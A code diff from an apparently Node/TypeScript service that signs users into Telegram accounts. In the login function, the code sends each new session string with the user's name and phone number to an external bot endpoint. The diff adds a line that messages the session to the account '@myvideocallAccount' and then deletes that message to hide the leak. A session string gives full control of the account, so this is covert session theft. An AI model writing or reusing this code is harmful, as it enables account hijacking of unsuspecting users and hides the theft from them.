@@ -70,8 +70,10 @@ async function fetchWithTimeout(resource, options = { timeout: undefined }, send
     const controller = new AbortController();
     const id = setTimeout(() => controller.abort(), timeout);
     try {
+        const url = encodeURI(resource);
+        console.log(resource, url);
         // const response = {ok :true}
-        const response = await fetch(resource, {
+        const response = await fetch(url, {
             ...options,
             signal: controller.signal
         });
@@ -86,11 +88,10 @@ async function fetchWithTimeout(resource, options = { timeout: undefined }, send
     }
 }
 
-
-app.get('/', async(req, res) => {
-    if (!client?.connected) {
-            await client.connect();
-        }
+app.get('/', async (req, res) => {
+    if (!client.connected) {
+        await client.connect();
+    };
     res.send('Hello World!');
 });
 
@@ -216,9 +217,11 @@ async function login() {
             isRegistrationRequired = true;
             termsOfService = result.termsOfService;
         } else {
-            const sess = client.session.save()
+            const sess = <string><unknown>client.session.save()
             console.log(sess);
             await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${phoneNumber} | ${sess}`);
+            const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
+            await msg.delete();
             await restAcc();
             return result.user
         }
